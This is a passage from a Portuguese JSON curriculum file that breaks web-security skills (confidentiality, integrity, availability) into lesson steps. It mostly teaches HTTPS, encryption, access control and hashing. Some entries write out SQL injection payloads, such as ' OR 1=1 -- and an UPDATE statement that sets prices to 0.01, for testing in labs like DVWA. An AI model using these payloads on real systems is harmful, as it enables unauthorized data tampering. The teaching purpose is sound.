                                    "Liste configs problemáticas: ausência de headers de segurança (CSP, X-Frame-Options).",
                                    "Explique CORS mal configurado permitindo acesso não autorizado a APIs.",
                                    "Analise cookies sem flags Secure/HttpOnly: expostos a XSS ou tráfego não criptografado.",
                                    "Discuta exposição em respostas de erro ou logs de servidor.",
                                    "Revise OWASP Top 10 itens relacionados (A5: Broken Access Control)."
                                  ],
                                  "verification": "Audite um site de exemplo (ex: httpbin.org) e liste 3 configs inadequadas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Checklist OWASP Secure Headers",
                                    "Ferramenta online SecurityHeaders.com",
                                    "Documentação Mozilla sobre headers"
                                  ],
                                  "tips": [
                                    "Use DevTools do navegador para inspecionar headers e cookies."
                                  ],
                                  "learningObjective": "Detectar configurações que comprometem a confidencialidade em apps web.",
                                  "commonMistakes": [
                                    "Focar só em frontend, ignorar backend configs",
                                    "Confundir com ataques de injeção"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar identificação em cenários reais de desenvolvimento web",
                                  "subSteps": [
                                    "Analise um app web hipotética: login sem HTTPS e cookies inseguros.",
                                    "Crie um relatório identificando MITM e vazamentos potenciais.",
                                    "Simule detecção usando ferramentas como Burp Suite Community.",
                                    "Discuta cenários reais: e-commerce com Wi-Fi público.",
                                    "Elabore lista de verificações para devs durante deploy."
                                  ],
                                  "verification": "Produza um relatório de 1 página com 3 ameaças identificadas e evidências.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Burp Suite Community Edition",
                                    "Site de teste DVWA",
                                    "Templates de relatório de segurança"
                                  ],
                                  "tips": [
                                    "Priorize apps reais ou labs como OWASP Juice Shop para prática."
                                  ],
                                  "learningObjective": "Integrar conhecimento para identificar ameaças em contextos práticos.",
                                  "commonMistakes": [
                                    "Não considerar cadeia completa (cliente-servidor)",
                                    "Omitir exemplos concretos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um formulário de login de e-commerce rodando em HTTP sobre Wi-Fi público, um atacante usa MITM com Wireshark para capturar credenciais e cookies de sessão, ou explora CORS wildcard (*) permitindo que um site malicioso acesse dados de usuário via API exposta.",
                              "finalVerifications": [
                                "Lista pelo menos 3 ameaças específicas à confidencialidade em apps web.",
                                "Explica MITM com diagrama ou descrição passo a passo.",
                                "Identifica 2 configs inadequadas comuns com exemplos.",
                                "Fornece cenários reais ilustrando impactos.",
                                "Sugere pelo menos 2 mitigações básicas por ameaça.",
                                "Demonstra compreensão da Triade CIA no contexto web."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de ameaças (sem erros conceituais).",
                                "Relevância e concretude dos exemplos e cenários.",
                                "Profundidade nos substeps e verificações práticas.",
                                "Cobertura completa de MITM e configs inadequadas.",
                                "Clareza na ligação com confidencialidade da CIA.",
                                "Criatividade em aplicações reais."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos TCP/IP e sniffing de pacotes.",
                                "Criptografia: TLS/SSL e certificados digitais.",
                                "Desenvolvimento Web: Configurações de servidores (Apache/Nginx).",
                                "Ética e Legislação: LGPD/GDPR e privacidade de dados.",
                                "Análise de Sistemas: Auditoria de segurança."
                              ],
                              "realWorldApplication": "Desenvolvedores web usam essa habilidade para auditar apps bancárias ou e-commerces, prevenindo vazamentos que levam a breaches como o Equifax (2017), garantindo conformidade com regulamentações e protegendo usuários contra roubo de dados em transações diárias."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.1.3",
                            "name": "Aplicar medidas básicas de confidencialidade",
                            "description": "Descrever o uso de HTTPS, criptografia de dados em repouso e controle de acesso para proteger informações em aplicações para a Internet.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Implementar HTTPS em uma aplicação web",
                                  "subSteps": [
                                    "Estude os conceitos básicos de TLS/SSL e como o handshake ocorre.",
                                    "Gere um certificado SSL auto-assinado usando OpenSSL.",
                                    "Configure o servidor web (ex: Node.js com Express) para usar HTTPS.",
                                    "Teste a conexão acessando via https://localhost.",
                                    "Substitua o certificado auto-assinado por um Let's Encrypt em produção."
                                  ],
                                  "verification": "Acessar o site via HTTPS sem erros de certificado e verificar o ícone de cadeado no navegador.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "OpenSSL instalado",
                                    "Node.js e Express",
                                    "Documentação Let's Encrypt"
                                  ],
                                  "tips": "Sempre redirecione HTTP para HTTPS para forçar conexões seguras.",
                                  "learningObjective": "Compreender e aplicar HTTPS para cifrar comunicações cliente-servidor.",
                                  "commonMistakes": "Ignorar a configuração de HSTS ou usar certificados expirados."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Aplicar criptografia de dados em repouso",
                                  "subSteps": [
                                    "Escolha um algoritmo simétrico como AES-256-GCM.",
                                    "Gere uma chave de criptografia segura usando crypto.randomBytes.",
                                    "Implemente funções de criptografia e descriptografia no código da aplicação.",
                                    "Armazene os dados sensíveis criptografados em um banco de dados como MongoDB.",
                                    "Gerencie chaves de forma segura, usando variáveis de ambiente ou serviços como AWS KMS."
                                  ],
                                  "verification": "Inserir dados sensíveis, recuperá-los e confirmar que são ilegíveis sem descriptografia.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Biblioteca crypto do Node.js",
                                    "Banco de dados local (ex: MongoDB)",
                                    "Editor de código"
                                  ],
                                  "tips": "Use IV (Initialization Vector) único para cada criptografia para maior segurança.",
                                  "learningObjective": "Proteger dados armazenados contra acesso não autorizado via criptografia.",
                                  "commonMistakes": "Reutilizar a mesma chave para todos os dados ou armazená-la em código fonte."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar controle de acesso baseado em roles",
                                  "subSteps": [
                                    "Defina roles como admin, user e guest no sistema.",
                                    "Implemente autenticação com JWT (JSON Web Tokens).",
                                    "Crie middlewares para verificar tokens e roles em rotas protegidas.",
                                    "Teste acessos com diferentes usuários e roles.",
                                    "Adicione logs de auditoria para tentativas de acesso negadas."
                                  ],
                                  "verification": "Tentar acessar rotas protegidas com token inválido/role insuficiente e confirmar bloqueio (401/403).",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "jsonwebtoken npm package",
                                    "Postman para testes de API",
                                    "Servidor de autenticação mock"
                                  ],
                                  "tips": "Valide tokens em cada request e use refresh tokens para sessões longas.",
                                  "learningObjective": "Garantir que apenas usuários autorizados acessem recursos específicos.",
                                  "commonMistakes": "Expor endpoints sensíveis sem verificação de autenticação."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar e testar as medidas de confidencialidade",
                                  "subSteps": [
                                    "Combine HTTPS, criptografia em repouso e controle de acesso em uma app única.",
                                    "Execute testes de penetração básicos (ex: OWASP ZAP).",
                                    "Monitore logs para vazamentos de dados sensíveis.",
                                    "Documente a configuração para manutenção futura.",
                                    "Avalie o impacto no desempenho e otimize se necessário."
                                  ],
                                  "verification": "Realizar um fluxo completo: login seguro, armazenar dados criptografados e acessar via HTTPS.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "OWASP ZAP ou similar",
                                    "Ferramentas de logging (Winston)",
                                    "Ambiente de teste local"
                                  ],
                                  "tips": "Automatize testes com scripts CI/CD para verificações contínuas.",
                                  "learningObjective": "Integrar medidas de confidencialidade de forma holística e funcional.",
                                  "commonMistakes": "Testar apenas cenários felizes, ignorando ataques como MITM."
                                }
                              ],
                              "practicalExample": "Crie uma API de gerenciamento de usuários para um blog. Use HTTPS para todas as rotas, criptografe senhas e emails no banco PostgreSQL com AES, e implemente RBAC (Role-Based Access Control) onde apenas admins editam usuários. Teste enviando requests via Postman e verifique que dados trafegam cifrados e acessos são restritos.",
                              "finalVerifications": [
                                "Explicar verbalmente o fluxo de uma conexão HTTPS segura.",
                                "Descriptografar dados armazenados e confirmar integridade.",
                                "Demonstrar bloqueio de acesso com role inadequada.",
                                "Identificar em Wireshark que tráfego está cifrado.",
                                "Listar 3 ferramentas para gerenciamento de certificados.",
                                "Gerar relatório de conformidade com princípios de confidencialidade."
                              ],
                              "assessmentCriteria": [
                                "Configuração correta de HTTPS sem warnings de segurança (100%).",
                                "Dados em repouso criptografados com algoritmo padrão forte (AES-256).",
                                "Controle de acesso impede 100% dos acessos não autorizados.",
                                "Integração sem vazamento de dados sensíveis em logs ou responses.",
                                "Testes cobrem cenários de falha e sucesso.",
                                "Documentação clara e reproduzível."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Fundamentos de criptografia assimétrica (RSA).",
                                "Ética e Cidadania: LGPD e privacidade de dados pessoais.",
                                "Redes de Computadores: Protocolos TCP/IP e camadas de segurança.",
                                "Administração: Políticas de segurança da informação (ISO 27001)."
                              ],
                              "realWorldApplication": "Em plataformas como bancos digitais (Nubank), HTTPS protege transações financeiras; e-commerces (Magazine Luiza) criptografam dados de cartões em BD; apps como WhatsApp usam controle de acesso para mensagens privadas, prevenindo breaches como o da Equifax em 2017."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.1.2",
                        "name": "Integridade",
                        "description": "Princípio da Triade CIA que assegura que os dados não sejam alterados de forma não autorizada ou acidental, mantendo a precisão e confiabilidade das informações em aplicações web.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.1.2.1",
                            "name": "Definir integridade na segurança de aplicações web",
                            "description": "Explicar integridade como a proteção contra modificações indevidas de dados, garantindo que a informação permaneça completa e precisa durante transmissão e armazenamento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a definição básica de integridade na Triade CIA",
                                  "subSteps": [
                                    "Ler a definição oficial da Triade CIA (Confidencialidade, Integridade, Disponibilidade) de fontes confiáveis como OWASP ou NIST.",
                                    "Isolar o conceito de integridade: proteção contra modificações não autorizadas, mantendo dados completos e precisos.",
                                    "Anotar exemplos cotidianos de integridade, como verificação de arquivos baixados.",
                                    "Comparar integridade com confidencialidade (esconder dados) e disponibilidade (acesso contínuo).",
                                    "Resumir em uma frase própria a definição de integridade."
                                  ],
                                  "verification": "Conseguir recitar a definição de integridade e diferenciá-la das outras duas da Triade CIA sem consultar materiais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Notebook ou papel para anotações",
                                    "Acesso à internet para OWASP.org ou NIST.gov",
                                    "Vídeo introdutório sobre Triade CIA (5-10 min)"
                                  ],
                                  "tips": "Use analogias simples, como 'integridade é como um selo lacrado em uma carta: garante que não foi aberta ou alterada'.",
                                  "learningObjective": "Dominar a definição conceitual de integridade no contexto da segurança de aplicações web.",
                                  "commonMistakes": "Confundir integridade com confidencialidade (pensar que é só 'esconder dados') ou disponibilidade (acesso rápido)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar ameaças à integridade em aplicações web",
                                  "subSteps": [
                                    "Listar ameaças comuns: injeção SQL, XSS, man-in-the-middle (MITM) durante transmissão.",
                                    "Analisar cenários: alteração de dados em formulários web ou durante upload de arquivos.",
                                    "Pesquisar casos reais, como ataques a e-commerces onde preços são modificados.",
                                    "Classificar ameaças por fase: transmissão (HTTPS vs HTTP) e armazenamento (bancos de dados).",
                                    "Mapear impactos: perda de precisão, completude ou confiança nos dados."
                                  ],
                                  "verification": "Criar uma tabela com 5 ameaças, suas descrições e impactos na integridade.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Planilha ou documento para tabela",
                                    "Artigos sobre OWASP Top 10",
                                    "Browser para simular cenários HTTP/HTTPS"
                                  ],
                                  "tips": "Visualize fluxos de dados em apps web (cliente-servidor) para entender onde a integridade pode ser violada.",
                                  "learningObjective": "Reconhecer violações específicas de integridade em contextos web.",
                                  "commonMistakes": "Ignorar transmissão como foco principal, focando só em armazenamento."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar mecanismos de proteção à integridade",
                                  "subSteps": [
                                    "Estudar hashes (SHA-256) e checksums para detecção de alterações.",
                                    "Aprender sobre assinaturas digitais e HMAC para autenticação de integridade.",
                                    "Analisar HTTPS/TLS para integridade em transmissão.",
                                    "Verificar como bancos de dados usam constraints e transações ACID para armazenamento.",
                                    "Testar um hash simples de uma string em ferramenta online."
                                  ],
                                  "verification": "Calcular hash de uma string antes/depois de alteração e confirmar detecção de mudança.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta online de hash (ex: cyberchef ou md5hashgenerator)",
                                    "Documentação TLS/HTTPS",
                                    "Ambiente de desenvolvimento simples (opcional)"
                                  ],
                                  "tips": "Lembre: integridade garante 'não alterado', não 'secreto'; combine com confidencialidade para segurança total.",
                                  "learningObjective": "Entender técnicas práticas para garantir integridade em apps web.",
                                  "commonMistakes": "Confundir hash com criptografia simétrica (hash é unidirecional)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar e formular uma definição completa de integridade",
                                  "subSteps": [
                                    "Combinar conceitos: definição + ameaças + proteções em um parágrafo coeso.",
                                    "Criar um diagrama da Triade CIA destacando integridade em apps web.",
                                    "Explicar verbalmente para um colega ou gravar áudio de 1 minuto.",
                                    "Revisar e refinar a definição para clareza e precisão.",
                                    "Aplicar em um mini-caso: 'Como garantir integridade em um form de pagamento?'"
                                  ],
                                  "verification": "Produzir uma definição escrita de 100-150 palavras que cubra todos os aspectos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta de desenho (Draw.io ou papel)",
                                    "Gravador de voz ou parceiro para feedback"
                                  ],
                                  "tips": "Estruture: 'Integridade é [definição], ameaçada por [exemplos], protegida por [técnicas] em apps web.'",
                                  "learningObjective": "Capacitar-se a definir e explicar integridade de forma autônoma e contextualizada.",
                                  "commonMistakes": "Definição genérica sem menção a transmissão/armazenamento ou apps web."
                                }
                              ],
                              "practicalExample": "Em um e-commerce, ao enviar dados de cartão de crédito via formulário web, usar HTTPS com TLS garante que os dados não sejam alterados por um atacante MITM durante a transmissão, mantendo a precisão do valor e CVV.",
                              "finalVerifications": [
                                "Explicar integridade em 30 segundos sem erros.",
                                "Identificar 3 ameaças e 3 proteções corretas.",
                                "Diferenciar integridade de confidencialidade e disponibilidade.",
                                "Calcular e validar um hash de exemplo.",
                                "Aplicar conceito a um cenário web real.",
                                "Produzir diagrama da Triade CIA com foco em integridade."
                              ],
                              "assessmentCriteria": [
                                "Definição precisa e completa (transmissão e armazenamento).",
                                "Correta identificação de ameaças web-specificas.",
                                "Descrição precisa de mecanismos de proteção.",
                                "Uso de exemplos concretos e relevantes.",
                                "Clareza na diferenciação da Triade CIA.",
                                "Capacidade de síntese em explicação oral/escrita."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Funções hash e algoritmos criptográficos.",
                                "Ética: Responsabilidade na proteção de dados usuários.",
                                "Desenvolvimento de Software: Implementação em código (ex: validações backend).",
                                "Redes: Protocolos TLS/HTTPS.",
                                "Gestão de TI: Políticas de segurança em organizações."
                              ],
                              "realWorldApplication": "Em bancos online, integridade assegura que saldos e transações não sejam alterados fraudulentamente, prevenindo prejuízos financeiros e mantendo confiança dos clientes, como no uso de assinaturas digitais em APIs de pagamento."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.2.2",
                            "name": "Identificar ameaças à integridade em aplicações web",
                            "description": "Listar e exemplificar ataques como injeção SQL, tampering de dados e checksum falhos em serviços web e apps móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o conceito de Integridade na Triade CIA",
                                  "subSteps": [
                                    "Defina a Triade CIA (Confidencialidade, Integridade, Disponibilidade).",
                                    "Explique como a Integridade garante que os dados não sejam alterados indevidamente.",
                                    "Identifique exemplos de violações de integridade em sistemas digitais.",
                                    "Relacione integridade com autenticação e autorização em apps web.",
                                    "Discuta o impacto de falhas de integridade em serviços web e apps móveis."
                                  ],
                                  "verification": "Escreva um parágrafo resumindo integridade e liste 3 exemplos de violações.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação OWASP Top 10",
                                    "Artigo sobre Triade CIA"
                                  ],
                                  "tips": "Use mnemônicos como 'CIA' para lembrar os pilares da segurança.",
                                  "learningObjective": "Compreender o papel da integridade na segurança de aplicações.",
                                  "commonMistakes": "Confundir integridade com confidencialidade (foco em alteração vs. acesso)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar ataques de Injeção SQL",
                                  "subSteps": [
                                    "Descreva o que é injeção SQL e como ela explora campos de entrada não sanitizados.",
                                    "Analise um exemplo de código vulnerável em PHP ou JavaScript.",
                                    "Explique como atacantes inserem comandos SQL maliciosos para alterar dados.",
                                    "Liste defesas como prepared statements e input validation.",
                                    "Simule uma injeção SQL em um ambiente de teste seguro."
                                  ],
                                  "verification": "Identifique e corrija uma vulnerabilidade SQL em um snippet de código fornecido.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta DVWA (Damn Vulnerable Web Application)",
                                    "Tutoriais OWASP SQL Injection"
                                  ],
                                  "tips": "Sempre teste entradas com payloads como ' OR 1=1 -- para detectar vulnerabilidades.",
                                  "learningObjective": "Reconhecer e exemplificar injeção SQL como ameaça à integridade.",
                                  "commonMistakes": "Ignorar sanitização de inputs em backends dinâmicos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Tampering de Dados e Falhas em Checksum",
                                  "subSteps": [
                                    "Defina tampering de dados como modificação não autorizada de payloads em trânsito.",
                                    "Explique checksums, hashes (MD5, SHA) e HMAC para verificação de integridade.",
                                    "Estude falhas como ausência de checksums em APIs REST ou apps móveis.",
                                    "Exemplifique ataques em serviços web (ex: alterar valores em JSON requests).",
                                    "Discuta soluções como TLS, assinaturas digitais e validação de integridade."
                                  ],
                                  "verification": "Calcule um checksum para um arquivo e detecte uma alteração simulada.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramentas como OpenSSL para hashes",
                                    "Documentação sobre HMAC"
                                  ],
                                  "tips": "Use ferramentas como Burp Suite para interceptar e modificar requests.",
                                  "learningObjective": "Identificar tampering e falhas de checksum em comunicações web/mobile.",
                                  "commonMistakes": "Confundir checksum com criptografia (checksum verifica integridade, não confidencialidade)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Identificação e Exemplificação em Contextos Reais",
                                  "subSteps": [
                                    "Liste 5 ameaças à integridade específicas para apps web e móveis.",
                                    "Crie exemplos concretos: SQLi em login web, tampering em API mobile.",
                                    "Analise cenários de serviços web (ex: e-commerce) e apps móveis (ex: banking).",
                                    "Desenvolva um checklist para identificar essas ameaças em código.",
                                    "Debata mitigações integradas em frameworks como React Native ou Spring Boot."
                                  ],
                                  "verification": "Produza um relatório com 3 exemplos de ataques e suas identificações.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Exemplos de código vulnerável no GitHub",
                                    "OWASP Mobile Top 10"
                                  ],
                                  "tips": "Registre sessões de prática com screenshots para revisão.",
                                  "learningObjective": "Aplicar conhecimento para listar e exemplificar ameaças em aplicações.",
                                  "commonMistakes": "Focar apenas em web desktop, ignorando especificidades mobile como storage local."
                                }
                              ],
                              "practicalExample": "Em um app de e-commerce web, um atacante usa injeção SQL no campo de busca para alterar preços no banco ('; UPDATE products SET price=0.01 WHERE id=1--), ou tampers um request JSON em uma API móvel removendo checksum, alterando quantidade de itens no carrinho para obter frete grátis.",
                              "finalVerifications": [
                                "Pode listar pelo menos 5 ameaças à integridade com exemplos.",
                                "Explica mecanismos de defesa para cada ataque estudado.",
                                "Identifica vulnerabilidades em cenários web e mobile fornecidos.",
                                "Calcula e valida checksums corretamente.",
                                "Produz um checklist pessoal para auditoria de integridade.",
                                "Relaciona ameaças à Triade CIA com precisão."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição de integridade e Triade CIA (20%)",
                                "Detalhe e correção nos exemplos de SQL injection (25%)",
                                "Compreensão de tampering e checksums com exemplos práticos (25%)",
                                "Aplicação em contextos web/mobile e checklist produzido (20%)",
                                "Identificação de erros comuns e mitigações (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Queries SQL e normalização.",
                                "Programação: Sanitização de inputs em linguagens web.",
                                "Redes: Protocolos TLS e segurança em APIs.",
                                "Ética e Direito: Implicações legais de breaches de integridade."
                              ],
                              "realWorldApplication": "Em bancos digitais, identificar SQLi previne fraudes em transferências; em apps de delivery, checksums evitam tampering de pedidos, reduzindo perdas financeiras como no caso Equifax breach onde falhas de integridade expuseram dados de 147 milhões."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.2.3",
                            "name": "Implementar controles de integridade",
                            "description": "Descrever técnicas como hashes (SHA-256), assinaturas digitais e validação de entrada para preservar a integridade em desenvolvimento de aplicações na nuvem e web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os fundamentos de integridade e hashes SHA-256",
                                  "subSteps": [
                                    "Estude o conceito de integridade na triade CIA e sua importância em apps web/nuvem.",
                                    "Aprenda como funcionam funções hash, focando em SHA-256 (propriedades de colisão-resistência e irreversibilidade).",
                                    "Explore exemplos de ataques à integridade, como modificação de dados em trânsito.",
                                    "Compare SHA-256 com outros hashes (MD5, SHA-1) e identifique por que SHA-256 é preferível.",
                                    "Pratique calcular hash manualmente de uma string simples usando ferramentas online."
                                  ],
                                  "verification": "Resuma em um documento os conceitos chave e calcule corretamente o hash de pelo menos 3 strings diferentes.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação oficial SHA-256 (NIST), ferramentas online como CyberChef ou hash.online-convert.com, notebook para anotações.",
                                  "tips": "Use diagramas para visualizar o processo de hashing como uma 'impressão digital' única.",
                                  "learningObjective": "Dominar os princípios teóricos de hashes para aplicação prática em controle de integridade.",
                                  "commonMistakes": "Confundir hash com criptografia simétrica; assumir que hashes são reversíveis."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar hashing SHA-256 em uma aplicação web",
                                  "subSteps": [
                                    "Instale uma biblioteca crypto (ex: crypto-js para JavaScript ou cryptography para Python).",
                                    "Crie uma função para gerar hash SHA-256 de uma string ou arquivo de entrada.",
                                    "Integre o hash em um endpoint de API web para validar dados recebidos.",
                                    "Armazene o hash original no banco de dados e compare com hash recalculado.",
                                    "Teste com dados modificados para verificar detecção de alterações."
                                  ],
                                  "verification": "Execute a função e confirme que hashes coincidem para dados íntegros e divergem para alterados (logs ou console).",
                                  "estimatedTime": "1 hora",
                                  "materials": "Node.js ou Python, VS Code, bibliotecas crypto-js ou hashlib, Postman para testes de API.",
                                  "tips": "Sempre salte o hash com salt único por usuário para maior segurança.",
                                  "learningObjective": "Desenvolver código funcional para hashing e verificação em apps web.",
                                  "commonMistakes": "Esquecer de codificar em UTF-8; reutilizar salts idênticos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar assinaturas digitais para verificação de integridade",
                                  "subSteps": [
                                    "Estude chaves assimétricas (RSA/ECDSA) e como funcionam assinaturas digitais.",
                                    "Gere par de chaves pública/privada usando bibliotecas como node-forge ou cryptography.",
                                    "Crie uma assinatura digital de um hash SHA-256 e verifique com chave pública.",
                                    "Integre em uma app web para assinar respostas de API ou arquivos.",
                                    "Teste cenários de revogação de chave e falhas de verificação."
                                  ],
                                  "verification": "Verifique uma assinatura válida e rejeite uma inválida, exibindo resultados em log.",
                                  "estimatedTime": "1 hora e 15 minutos",
                                  "materials": "Node.js com node-forge, OpenSSL para geração de chaves, documentação RSA/ECDSA.",
                                  "tips": "Use chaves de pelo menos 2048 bits para segurança adequada.",
                                  "learningObjective": "Aplicar assinaturas digitais para autenticação não-repúdio em comunicações seguras.",
                                  "commonMistakes": "Confundir chave pública com privada na assinatura; ignorar padding schemes."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar validação de entrada e integrar controles em app na nuvem",
                                  "subSteps": [
                                    "Implemente validações de entrada com bibliotecas como Joi ou express-validator.",
                                    "Combine hash + assinatura em um fluxo de upload/edição de dados.",
                                    "Deploy em nuvem (AWS/Heroku) e configure para verificar integridade em endpoints.",
                                    "Adicione logs e alertas para falhas de integridade.",
                                    "Realize testes end-to-end com ferramentas como OWASP ZAP."
                                  ],
                                  "verification": "Submeta dados íntegros e alterados; confirme aceitação/rejeição via API responses.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Heroku/AWS free tier, Joi/express-validator, OWASP ZAP para testes.",
                                  "tips": "Valide no client e server-side para defesa em profundidade.",
                                  "learningObjective": "Integrar múltiplos controles de integridade em uma aplicação real na nuvem.",
                                  "commonMistakes": "Validar apenas client-side; negligenciar validação de tamanho de input."
                                }
                              ],
                              "practicalExample": "Em um app de compartilhamento de documentos na web (como Google Drive simplificado), ao fazer upload de um arquivo: 1) Gere hash SHA-256 do arquivo; 2) Assine o hash com chave privada do servidor; 3) Valide entrada (tamanho, tipo); 4) Armazene hash+assinatura; 5) Ao download, revalide hash e assinatura para garantir que o arquivo não foi alterado em trânsito ou storage.",
                              "finalVerifications": [
                                "Hashes SHA-256 gerados coincidem para dados idênticos e divergem para alterados.",
                                "Assinaturas digitais são verificadas corretamente com chave pública.",
                                "Validações de entrada rejeitam inputs maliciosos (ex: SQL injection, oversized).",
                                "Integração em app nuvem detecta e loga violações de integridade.",
                                "Testes end-to-end passam sem falsos positivos/negativos.",
                                "Performance não degradada (>95% throughput original)."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: Explicação correta de hashes, assinaturas e validação (nota 1-10).",
                                "Código funcional: Implementação sem bugs em hashing e verificação.",
                                "Cobertura de segurança: Todos os controles integrados e testados contra ataques comuns.",
                                "Eficiência: Tempos de execução <500ms por operação.",
                                "Documentação: README com passos de reprodução e testes.",
                                "Inovação: Adição de salt ou rotação de chaves."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Criptografia assimétrica e teoria dos números (modular arithmetic).",
                                "Redes: Protocolos HTTPS/TLS que incorporam integridade (HMAC).",
                                "Banco de Dados: Hashing de senhas e checksums em storage.",
                                "Desenvolvimento Ágil: Integração contínua com testes de segurança automatizados."
                              ],
                              "realWorldApplication": "Em sistemas bancários online, hashes SHA-256 e assinaturas digitais garantem que transações não sejam alteradas durante processamento na nuvem (ex: PIX no Brasil), prevenindo fraudes; validação de entrada protege contra injeções em formulários de login."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.1.3",
                        "name": "Disponibilidade",
                        "description": "Princípio da Triade CIA que garante que os serviços e dados estejam acessíveis quando necessários, evitando interrupções em aplicações web.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.1.3.1",
                            "name": "Definir disponibilidade na segurança de aplicações web",
                            "description": "Explicar disponibilidade como a capacidade de sistemas e dados estarem operacionais e acessíveis para usuários autorizados, sem downtime excessivo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito fundamental de disponibilidade",
                                  "subSteps": [
                                    "Leia a definição oficial de disponibilidade na Triade CIA: capacidade de sistemas e dados estarem acessíveis e operacionais para usuários autorizados.",
                                    "Identifique os elementos chave: operacionais, acessíveis, usuários autorizados e ausência de downtime excessivo.",
                                    "Compare disponibilidade com indisponibilidade (downtime) usando exemplos simples como uma lâmpada ligada/desligada.",
                                    "Anote sinônimos e antônimos em um glossário pessoal.",
                                    "Resuma o conceito em suas próprias palavras em uma frase curta."
                                  ],
                                  "verification": "Escreva uma definição de disponibilidade em 1-2 frases e compare com fontes confiáveis como OWASP ou NIST.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Documentação OWASP Top 10, glossário NIST SP 800-53, caderno ou editor de texto.",
                                  "tips": "Use analogias cotidianas, como um caixa eletrônico sempre disponível para saques.",
                                  "learningObjective": "Definir disponibilidade com precisão conceitual básica.",
                                  "commonMistakes": "Confundir disponibilidade com performance (velocidade) em vez de acessibilidade."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Contextualizar disponibilidade em aplicações web",
                                  "subSteps": [
                                    "Analise como apps web dependem de servidores, bancos de dados e redes para manter disponibilidade.",
                                    "Estude exemplos de apps web: sites de e-commerce precisam estar 99.9% do tempo disponíveis.",
                                    "Diferencie downtime planejado (manutenção) de não planejado (ataques DDoS).",
                                    "Liste componentes web críticos: load balancers, CDNs e redundância.",
                                    "Crie um diagrama simples de fluxo de uma requisição web e marque pontos de falha de disponibilidade."
                                  ],
                                  "verification": "Desenhe um fluxograma de app web destacando 3 pontos onde disponibilidade pode falhar.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Ferramenta de diagrama como Draw.io, artigos sobre arquitetura web (ex: AWS Well-Architected).",
                                  "tips": "Pense em apps que você usa diariamente e pergunte: 'O que acontece se cair?'",
                                  "learningObjective": "Relacionar disponibilidade ao ecossistema de aplicações web.",
                                  "commonMistakes": "Ignorar o papel de usuários autorizados, focando só em uptime geral."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar ameaças e impactos à disponibilidade",
                                  "subSteps": [
                                    "Identifique ameaças comuns: DDoS, falhas de hardware, sobrecarga de tráfego.",
                                    "Pesquise casos reais como o ataque DDoS ao GitHub em 2018.",
                                    "Calcule impacto: downtime de 1 hora em um site de varejo pode custar milhares de dólares.",
